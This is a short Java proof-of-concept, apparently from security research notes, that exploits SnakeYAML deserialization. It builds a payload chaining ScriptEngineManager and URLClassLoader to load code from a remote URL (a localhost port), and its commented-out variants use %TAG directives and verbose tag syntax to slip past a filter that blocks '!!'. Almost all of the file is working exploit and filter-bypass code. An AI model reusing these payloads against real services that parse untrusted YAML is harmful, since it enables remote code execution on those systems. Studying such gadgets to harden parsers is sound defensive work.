package trick;

/**
 * https://b1ue.cn/archives/407.html
 */

import org.yaml.snakeyaml.Yaml;

public class SnakeYaml {
    public static void main(String[] args) {
        String data = "!" +
                "!javax.script.ScriptEngineManager [!" +
                "!java.net.URLClassLoader [[!" +
                "!java.net.URL [\"http://127.0.0.1:2333/\"]]]]";
       //-------------------绕过-----------
        //String data = "%TAG !      tag:yaml.org,2002:\n" +
        //        "---\n" +
        //        "!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [\"http://127.0.0.1:2333/\"]]]]";

        //String data = "!<tag:yaml.org,2002:javax.script.ScriptEngineManager> "+
        //                    "[!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL>" +
        //                        " [\"http://127.0.0.1:2333\"]]]]";

        Object parse = SnakeYaml.parse(data,Object.class);

    }

    public static Object parse(String data,Class clazz){
        if(data.indexOf("!!")!=-1){
            throw new RuntimeException("error");
        }
        Yaml yaml = new Yaml();
        return yaml.loadAs(data,clazz);
    }
}
